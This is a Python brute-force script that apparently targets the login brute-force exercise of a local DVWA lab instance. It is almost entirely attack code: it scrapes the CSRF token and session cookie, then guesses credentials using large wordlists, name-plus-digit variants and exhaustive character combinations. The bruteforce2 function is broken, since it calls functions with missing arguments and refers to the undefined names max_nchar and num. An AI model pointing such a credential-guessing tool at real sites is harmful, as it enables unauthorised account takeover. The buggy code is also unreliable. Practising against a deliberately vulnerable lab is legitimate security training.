import string
from itertools import product
from time import time
from numpy import loadtxt
import sys
import re
from bs4 import BeautifulSoup
import requests

target = 'http://127.0.0.1/DVWA'
sec_level = 'low'
check_words = 'Welcome'

def req(password,u,session_id):
    dvwa_user = u
    dvwa_pass = password
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "Login": "Login"
    }
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    r = requests.get("{0}/vulnerabilities/brute/".format(target), params=data, cookies=cookie, allow_redirects=False)
    soup = BeautifulSoup(r.text, "html.parser")
    data = soup.findAll('div', class_='vulnerable_code_area')
    #print(data)
    for d in data:
        if check_words in d.text:
            return True
        else:
            return False
    

def product_loop(generator,u,s):
    for p in generator:
        if req(''.join(p),u,s):
            return ''.join(p)
    return False

def product_loop2(generator,na,u,s):
    name_=str(na)
    for p in generator:
        pa=''.join(p)
        namee=name_+pa
        if req(namee,u,s):
            return namee
        namee=name_.lower()+pa
        if req(namee,u,s):
            return namee
    return False


def bruteforce(u,s,max_nchar=16):
    common_pass = loadtxt('pass1m.txt', dtype=str)
    common_names = loadtxt('pname.txt', dtype=str)
    i=0
    for c in common_pass:
        i+=1
        if req(c,u,s):
            return c
        
    for l in range(1, 10):
        generator = product(string.digits, repeat=int(l))
        print("\t..%d digit" % l)
        p = product_loop(generator,u,s)
        if p is not False:
            return p
          
    for l in range(1, max_nchar):
        generator = product(string.digits, repeat=int(l))
        print("\t..%d digit" % l)
        p = product_loop2(generator,u.capitalize(),u,s)
        if p is not False:
            return p
    
    for n in common_names:
        if req(n,u,s):
            return n
        if req(n.lower(),u,s):
            return n   
        for l in range(1, max_nchar):
            generator = product(string.digits, repeat=int(l))
            print("\t..%d digit" % l)
            p = product_loop2(generator,n,u,s)
            if p is not False:
                return p
            
    for l in range(11, 16):
        generator = product(string.digits, repeat=int(l))
        print("\t..%d digit" % l)
        p = product_loop(generator,u,s)
        if p is not False:
            return p
    
    for l in range(1, max_nchar + 1):
        print("\t..%d char" % l)
        generator = product(string.digits + string.ascii_lowercase,
                            repeat=int(l))
        p = product_loop(generator,u,s)
        if p is not False:
            return p

    all_char = string.digits + string.ascii_letters + string.punctuation
    for l in range(1, max_nchar + 1):
        print("\t..%d char" % l)
        generator = product(all_char, repeat=int(l))
        p = product_loop(generator,u,s)
        if p is not False:
            return p

def csrf():
    r = requests.get("{0}/login.php".format(target), allow_redirects=False)
    #print(r.text)
    soup = BeautifulSoup(r.text, "html.parser")
    user_token=soup.find('input',{'type': 'hidden'}).get('value')
    sec=r.headers["set-cookie"]
    sec_s_i=sec.find("PHPSESSID=")
    session_id=''
    for i in range (sec_s_i+10,len(sec)):
        if sec[i]!=';':
            session_id+=sec[i]
        else:
            break
    return session_id,user_token

def login(session_id,user_token,d_user,d_pass):
    data = {
        "username": d_user,
        "password": d_pass,
        "user_token": user_token,
        "Login": "Login"
    }
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    r = requests.post("{0}/login.php".format(target), data=data, cookies=cookie, allow_redirects=False)
    print(r.headers["Location"])

def bruteforce2(s):
    common_pass = loadtxt('pass1m.txt', dtype=str)
    common_names = loadtxt('pname.txt', dtype=str)
    common_usernames = loadtxt('usernames.txt', dtype=str)
    common_num=loadtxt('num.txt', dtype=str)
    for u in common_usernames:
        for c in common_pass:
            if req(c,u,s):
                print(u+"-"+c)
    for u in common_usernames:
        for n in common_names:
            if req(n):
                return n
            if req(n.lower()):
                return n   
            for l in range(1, max_nchar):
                generator = product(string.digits, repeat=int(l))
                print("\t..%d digit" % l)
                p = product_loop2(generator,n,u,s)
                if p is not False:
                    print(u+'-'+p)
    for u in common_usernames:
        for l in range(1, 8):
            generator = product(string.digits, repeat=int(l))
            print("\t..%d digit" % l)
            p = product_loop(generator,u,s)
            if p is not False:
                print(u+'-'+p)
            
    for u in common_names:
        for c in common_pass:
            if req(c,u,s):
                print(u+"-"+c)
    for u in common_names:
        for n in common_names:
            if req(n):
                return n
            if req(n.lower()):
                return n   
            for l in range(1, max_nchar):
                generator = product(string.digits, repeat=int(l))
                print("\t..%d digit" % l)
                p = product_loop2(generator,n,u,s)
                if p is not False:
                    print(u+'-'+p)
    for u in common_names:
        for l in range(1, 8):
            generator = product(string.digits, repeat=int(l))
            print("\t..%d digit" % l)
            p = product_loop(generator,u,s)
            if p is not False:
                print(u+'-'+p)
            
    for u in num:
        for c in common_pass:
            if req(c,u,s):
                print(u+"-"+c)
    for u in num:
        for n in common_names:
            if req(n):
                n
            if req(n.lower()):
                return n   
            for l in range(1, max_nchar):
                generator = product(string.digits, repeat=int(l))
                print("\t..%d digit" % l)
                p = product_loop2(generator,n,u,s)
                if p is not False:
                    print(u+'-'+p)
    for u in num:
        for l in range(1, 8):
            generator = product(string.digits, repeat=int(l))
            print("\t..%d digit" % l)
            p = product_loop(generator,u,s)
            if p is not False:
                print(u+'-'+p)
    
    

s_i,u_t=csrf()
d_user='Admin'
d_pass='password'
